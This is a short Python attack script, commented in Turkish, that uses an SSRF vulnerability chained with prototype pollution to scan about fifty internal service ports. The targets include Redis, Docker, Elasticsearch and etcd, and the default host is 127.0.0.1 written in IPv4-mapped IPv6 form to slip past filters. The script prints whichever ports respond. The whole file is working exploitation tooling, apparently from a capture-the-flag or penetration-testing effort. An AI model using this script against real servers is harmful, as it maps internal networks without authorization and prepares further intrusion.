#!/usr/bin/env python3
"""SSRF üzerinden iç port taraması (sıralı — prototype pollution global state olduğu için)."""
import sys

from ssrf import fetch, new_session

PORTS = [
    80, 81, 88, 443, 1080, 1337, 1880, 2375, 3000, 3001, 3002, 3306, 4000, 4001,
    4200, 5000, 5001, 5002, 5432, 5601, 6000, 6379, 7000, 7001, 8000, 8001, 8008,
    8080, 8081, 8088, 8090, 8443, 8500, 8888, 9000, 9001, 9090, 9200, 9300, 11211,
    27017, 3128, 5984, 8123, 8200, 2379, 10000, 50000,
]

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "[::ffff:127.0.0.1]"
    op = new_session()
    for port in PORTS:
        url = f"http://{host}:{port}/"
        try:
            out = fetch(op, url, timeout=12).strip()
        except Exception as exc:  # noqa: BLE001
            out = f"<hata: {exc}>"
        if "ECONNREFUSED" in out:
            continue
        print(f"[+] {port}: {out[:300]}\n")
